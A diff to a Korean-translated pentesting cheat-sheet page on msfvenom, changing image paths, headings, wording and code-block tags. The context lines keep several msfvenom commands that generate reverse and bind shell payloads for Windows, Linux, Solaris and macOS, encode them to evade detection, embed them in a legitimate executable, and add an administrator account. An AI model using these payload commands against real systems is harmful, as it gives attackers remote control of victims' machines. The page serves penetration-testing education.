@@ -15,7 +15,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 </details>
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
 
@@ -26,7 +26,7 @@ Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to 
 실시간 뉴스와 통찰력을 통해 빠르게 변화하는 해킹 세계의 최신 정보를 유지하세요.
 
 **Latest Announcements**\
-새로운 버그 바운티와 중요한 플랫폼 업데이트에 대한 정보를 유지하세요.
+새로운 버그 바운티와 중요한 플랫폼 업데이트에 대한 최신 정보를 유지하세요.
 
 **Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
 
@@ -59,7 +59,7 @@ PrependSetuid=True #Use this to create a shellcode that will execute something w
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f exe > reverse.exe
 ```
-### 바인드 셸
+### Bind Shell
 
 {% code overflow="wrap" %}
 ```bash
@@ -86,8 +86,6 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-{% endcode %}
-
 ### 실행 파일 내에 포함
 
 {% code overflow="wrap" %}
@@ -105,13 +103,15 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/wind
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f elf > reverse.elf
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
 ```
-### 바인드 셸
+### Bind Shell
 
 {% code overflow="wrap" %}
 ```bash
 msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=(IP Address) LPORT=(Your Port) -f elf > bind.elf
 ```
 ### SunOS (Solaris)
+
+{% code overflow="wrap" %}
 ```bash
 msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTACKER IP) LPORT=(ATTACKER PORT) -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
 ```
@@ -125,8 +125,6 @@ msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=(ATTAC
 ```bash
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f macho > reverse.macho
 ```
-{% endcode %}
-
 ### **바인드 셸**
 
 {% code overflow="wrap" %}
@@ -205,7 +203,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 ```
 {% endcode %}
 
-<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
 경험이 풍부한 해커 및 버그 바운티 헌터와 소통하기 위해 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 서버에 참여하세요!
 
@@ -215,7 +213,7 @@ msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f
 **실시간 해킹 뉴스**\
 실시간 뉴스와 통찰력을 통해 빠르게 변화하는 해킹 세계의 최신 정보를 유지하세요.
 
-**최신 공지사항**\
+**최신 발표**\
 새로운 버그 바운티 출시 및 중요한 플랫폼 업데이트에 대한 정보를 유지하세요.
 
 오늘 [**Discord**](https://discord.com/invite/N3FrSbmwdy)에 참여하여 최고의 해커들과 협업을 시작하세요!
